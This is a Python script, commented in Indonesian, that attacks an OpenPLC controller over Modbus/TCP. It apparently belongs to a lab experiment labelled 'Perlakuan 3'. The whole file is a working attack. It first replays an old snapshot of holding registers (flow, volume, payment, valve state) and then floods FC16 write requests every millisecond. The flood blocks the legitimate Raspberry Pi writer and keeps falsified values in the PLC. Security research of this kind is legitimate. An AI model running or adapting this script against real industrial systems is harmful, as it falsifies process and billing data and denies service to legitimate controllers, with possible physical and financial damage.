#!/usr/bin/env python3
"""
attack_replay_flood.py

Perlakuan 3 yang sesuai tabel:
1. Replay data lama (snapshot) seperti sumber asli selama 15 detik.
2. Flood write snapshot yang sama dengan kecepatan tinggi (tanpa RST).
   - OpenPLC tetap hidup.
   - Raspberry Pi tidak bisa menulis karena koneksi/timeout.
   - Nilai register tetap di snapshot attacker.
"""

import socket
import struct
import time
from typing import List

TARGET_IP = "192.168.21.209"
TARGET_PORT = 502
UNIT_ID = 1

START_REGISTER = 1024

# Snapshot legitimate lama (data dari PRE_ATTACK)
REPLAY_SNAPSHOT = [
    79,      # HR1024 ODO
    2250,    # HR1025 Flow x1000
    14500,   # HR1026 Volume x10000
    1,       # HR1027 Payment
    125,     # HR1028 Sequence (lama)
    1,       # HR1029 Observed Valve
    1,       # HR1030 Node ID
]

# ---- Parameter Fase 1: Replay normal ----
REPLAY_DURATION = 15      # detik
REPLAY_INTERVAL = 1.0     # detik (meniru interval Raspi)

# ---- Parameter Fase 2: Flood (blokir Raspi, tanpa RST) ----
FLOOD_DURATION = 30       # detik
FLOOD_INTERVAL = 0.001    # 1 milidetik (cukup cepat, aman untuk PLC)


def build_fc16_request(
    transaction_id: int,
    start_address: int,
    values: List[int],
) -> bytes:
    quantity = len(values)
    byte_count = quantity * 2
    register_data = b"".join(struct.pack(">H", v & 0xFFFF) for v in values)
    pdu = struct.pack(">BHHB", 0x10, start_address, quantity, byte_count) + register_data
    mbap = struct.pack(">HHHB", transaction_id & 0xFFFF, 0, len(pdu) + 1, UNIT_ID)
    return mbap + pdu


def connect_target() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((TARGET_IP, TARGET_PORT))
    return sock


def run_stage(stage_name: str, duration: float, interval: float, start_tid: int) -> int:
    print(f"\n[START] {stage_name}")
    print(f"  Target  : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Register: HR{START_REGISTER} - HR{START_REGISTER+len(REPLAY_SNAPSHOT)-1}")
    print(f"  Snapshot: {REPLAY_SNAPSHOT}")
    print(f"  Durasi  : {duration} detik, Interval: {interval} detik")

    sock = connect_target()
    started = time.monotonic()
    sent_count = 0
    tid = start_tid

    try:
        while time.monotonic() - started < duration:
            request = build_fc16_request(tid, START_REGISTER, REPLAY_SNAPSHOT)
            try:
                sock.sendall(request)
                sent_count += 1
                tid = (tid + 1) & 0xFFFF
            except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError) as e:
                print(f"[WARN] Koneksi terputus: {e}. Reconnect...")
                sock.close()
                time.sleep(0.2)
                sock = connect_target()
                continue

            # Cetak progress
            if stage_name == "REPLAY" or sent_count % 10000 == 0:
                print(f"[{stage_name}] {sent_count} request terkirim")

            if interval > 0:
                time.sleep(interval)

    finally:
        sock.close()  # Kirim FIN, BUKAN RST. OpenPLC tetap hidup.

    print(f"[END] {stage_name}: {sent_count} request terkirim")
    return tid


def main():
    print("=" * 68)
    print(" PERLAKUAN 3 — REPLAY + FLOOD (Tanpa RST, OpenPLC Tetap Hidup)")
    print("=" * 68)
    print("Tujuan: Blokir komunikasi Raspi, pertahankan data palsu di register.")
    print("=" * 68)

    tid = 1

    # FASE 1: Replay normal (seperti sumber asli)
    tid = run_stage("REPLAY", REPLAY_DURATION, REPLAY_INTERVAL, tid)

    print("\n[TRANSISI] Replay selesai. Memulai flood untuk memblokir Raspi...")

    # FASE 2: Flood cepat (tanpa RST)
    run_stage("FLOOD", FLOOD_DURATION, FLOOD_INTERVAL, tid)

    print("\n[DONE] Perlakuan 3 selesai.")
    print("[INFO] OpenPLC tidak direstart. Nilai register tetap di snapshot attacker.")
    print("[INFO] Raspi seharusnya timeout/gagal menulis selama fase flood.")


if __name__ == "__main__":
    main()